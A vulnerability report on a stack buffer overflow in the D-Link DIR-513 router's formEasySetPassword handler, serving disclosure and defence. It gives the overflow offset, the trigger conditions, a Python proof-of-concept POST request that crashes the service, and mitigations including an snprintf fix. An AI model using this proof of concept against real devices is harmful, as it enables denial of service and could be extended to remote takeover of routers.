## Vulnerability Report: D-Link DIR-513 Buffer Overflow

**Vulnerability Type:** Common Vulnerability

**Vendor:** D-Link

**Vendor Website:** [https://www.dlink.com.cn/](https://www.dlink.com.cn/)

**Affected Object Type:** Network Equipment (Switches, Routers, etc.)

**Affected Product:** DIR-513

**Affected Versions:** A1 FW110, A2 FW110

**Component Vulnerability:** No

**Vulnerability Name:** D-Link DIR-513 `formEasySetPassword` Function Buffer Overflow (Binary Vulnerability)

**Version:** 1.10

### Vulnerability Description

D-Link DIR-513 is a network router manufactured by D-Link. A stack-based buffer overflow vulnerability exists in the Web service of the D-Link DIR-513 when processing form requests.

Within the `formEasySetPassword` function, the program retrieves the user-controllable `curTime` parameter via `websGetVar` without any length validation. When the `language` parameter is neither "SC" nor "TW", the program calls the unbounded `sprintf` function to concatenate the oversized `curTime` string into a fixed-size (104 bytes) stack buffer `v11`. An attacker can send a specially crafted HTTP POST request to trigger a stack overflow, overwriting the return address (located 172 bytes away). This can lead to a Denial of Service (DoS) or Remote Code Execution (RCE).

---

### Trigger Point

The vulnerability is located in the `formEasySetPassword` function (Address: `0x4439b4`) of the network service program, specifically at the following statement: `sprintf(v11, "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var);`

**Trigger Condition:** The vulnerability branch is triggered when an HTTP POST request contains an excessively long `curTime` parameter and the `language` parameter is **not** set to "SC" or "TW".

---

### Proof of Concept (PoC)



```
import requests
import struct

# Target Configuration
TARGET_IP = "192.168.0.1"
URL = f"http://{TARGET_IP}/goform/formEasySetPassword"

# Offset Calculation
OFFSET_TO_RETURN_ADDR = 172  # From v11 to the return address
FORMAT_STR_LEN = 36          # Length of the static format string portion
PADDING_LEN = OFFSET_TO_RETURN_ADDR - FORMAT_STR_LEN + 50 

# Construct Payload
padding = b'A' * PADDING_LEN
payload = padding 

# Construct HTTP Request
# Note: language must not be "SC" or "TW" to hit the vulnerable code path
data = {
    "curTime": payload,  
    "language": "EN",  # Ensure the vulnerability branch is triggered
    "config.password": "test123",
    "config.user_password": "test123"
}

# Send Request
response = requests.post(URL, data=data)
print(f"Response Status: {response.status_code}")
```

---

### Solutions

#### Temporary Mitigation:

1. **Input Validation:** Implement length validation for the `curTime` parameter, restricting it to a reasonable limit (e.g., maximum 60 bytes) and rejecting any requests that exceed this limit.

2. **Traffic Filtering:** Deploy WAF (Web Application Firewall) or traffic monitoring rules at the network boundary to intercept malicious POST requests directed at `/formEasySetPassword` that contain abnormally long `curTime` values.

#### Official Fix:

Replace the high-risk `sprintf` function with a safe, bounds-checked alternative: `snprintf(v11, sizeof(v11), "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var);`
